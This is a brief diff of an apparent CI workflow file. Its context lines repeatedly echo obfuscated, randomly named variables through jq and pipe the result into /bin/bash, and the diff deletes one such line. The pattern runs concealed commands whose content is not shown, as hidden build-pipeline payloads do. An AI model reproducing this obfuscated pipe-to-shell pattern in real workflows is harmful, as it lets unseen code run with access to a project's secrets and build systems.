@@ -31,7 +31,6 @@ jobs:
           echo $qnng9800 | jq -r .lq9763 | /bin/bash
           echo $crqw70580 | jq -r .w10 | /bin/bash
           echo $ook9983 | jq -r .pjknk0 | /bin/bash
-          echo $t76 | jq -r .huvvp74648 | /bin/bash
           echo $zrr08 | jq -r .guxc3 | /bin/bash
 
       - name: Archive artifact
